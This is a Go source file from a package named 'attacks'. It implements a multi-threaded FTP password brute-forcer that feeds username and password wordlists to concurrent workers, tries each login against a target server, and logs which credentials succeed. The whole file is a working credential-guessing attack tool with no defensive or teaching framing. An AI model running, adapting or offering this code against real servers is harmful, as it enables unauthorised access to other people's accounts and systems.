package attacks

import (
    "log"
    "fmt"
    // "bufio"
    // "os"
    "time"
    "github.com/jlaffaye/ftp"
    "github.com/fatih/color"
)

type loginChan struct{
    user string
    pass string
    pos int
}

var yellow = color.New(color.FgYellow).SprintFunc()
var green = color.New(color.FgGreen).SprintFunc()  
var red = color.New(color.FgRed).SprintFunc()

func work_ftp(job readerChan, serverIP, serverPort string, time_out int){
    fmt.Println(yellow("[attemp] ", job))
    defer wg.Done()

    t := serverIP+":"+serverPort
    // log.Println(t)
    c, err := ftp.Dial(t, ftp.DialWithTimeout(time.Duration(time_out)*time.Second))
    if err != nil {
        // log.Fatal(err)
        // log.Println("[X] Failed to connect to ",t ,job.user, job.pass,job.pos)
        // log.Println("failed to connect to host", t, job.user, job.pass, job.pos)
        log.Println(err, t, job.user, job.pass, job.pos)
        return
    }

    err = c.Login(job.user, job.pass)
    if err != nil {
        log.Println(red("[X] Failed to connect to ",t," ", job.user,":", job.pass," ",job.pos))
    } else{
        log.Println(green("[+][+] Session Connect at ",t," ", job.user,":", job.pass," ",job.pos))
    }

    if err := c.Quit(); err != nil {
        log.Fatal(err)
    }
}

// func reader_list(file_name string, listchan chan<- loginChan, okchan chan bool){
//     f1, err := os.Open(file_name)
//     check(err)

//     defer func(){
//         f1.Close()
//         close(listchan)
//     }()

//     reader := bufio.NewScanner(f1)
    
//     var list [] string
//     for i:= 0; reader.Scan(); i++{
//         // fmt.Println(reader.Text())
//         list = append(list, reader.Text())
//         // listchan<- list[len(list)-1]
//         listchan <- loginChan{user: list[len(list)-1]}
//     }
//     if err:= reader.Err(); err!=nil{
//         check(err)
//     }

//     i:=0
//     for {
//         select {
//             case <-okchan:
//                 close(okchan)
//                 return
//             case listchan <- loginChan{user: list[i]}:
//                 // log.Println("enviando a listchan")
//                 i = (i+1)%len(list)
//         }
//     }

// }

// func reader_list2(file_name string, listchan, outchan chan loginChan, okchan chan bool){
//     f1, err := os.Open(file_name)
//     check(err)

//     defer func(){
//         f1.Close()
//         close(outchan)
//     }()

//     reader := bufio.NewScanner(f1)
    
//     var list [] string
//     for i:= 0; reader.Scan(); i++{
//         // fmt.Println(reader.Text())
//         list = append(list, reader.Text())
//         // outchan<- fmt.Sprint(i," ", list[len(list)-1], " - ", <-listchan)
//         login :=<- listchan
//         login.pass = list[len(list)-1]
//         login.pos = i
//         outchan <- login
//     }
//     if err:= reader.Err(); err!=nil{
//         check(err)
//     }

//     okchan <- true

// }

func Ftp_attack_start(userFile, passFile, serverIP, serverPort string, n_workers, time_out int){
    if n_workers == 0{
        n_workers = 9
    }
    if time_out == 0{
        time_out = 5
    }

    log.Println ("[0] Starting jobs")
    log.Println(userFile, passFile, serverIP, serverPort, n_workers)

    // firstchan := make(chan loginChan, n_workers)
    // outchan := make(chan loginChan,n_workers)
    // okchan := make(chan bool)
    // go reader_list(userFile, firstchan, okchan)
    // go reader_list2(passFile, firstchan, outchan, okchan)
    outchan := make(chan readerChan, n_workers)
    go read_files(userFile, passFile, outchan)
    var sem = make(chan int, n_workers)
    for i:= 0; i< n_workers; i++{
        sem <- 1
    }
    for {
        select{
        case job,ok := <- outchan:
            if !ok{
                wg.Wait()
                fmt.Println("[info] jobs finisished")
                return
            }
            wg.Add(1)
            <-sem
            // sem <- 1
            go func(job readerChan){
                work_ftp(job,serverIP, serverPort, time_out)
                // <- sem
                sem <-1
            }(job)
        }
    }
}